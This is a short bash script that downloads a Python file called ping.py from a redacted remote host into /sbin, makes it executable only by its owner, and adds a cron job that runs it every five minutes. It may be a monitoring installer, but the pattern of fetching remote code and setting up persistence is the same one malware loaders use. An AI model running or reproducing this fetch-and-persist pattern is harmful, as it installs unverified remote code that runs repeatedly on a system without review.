#!/usr/bin/env bash

wget http://XXXXXXXX.XXXX.XXX/XX/ping.py -O /sbin/ping.py
chmod u+x /sbin/ping.py
chmod go-rwx /sbin/ping.py

(crontab -l 2>/dev/null; echo "*/5 * * * * /sbin/ping.py") | crontab -
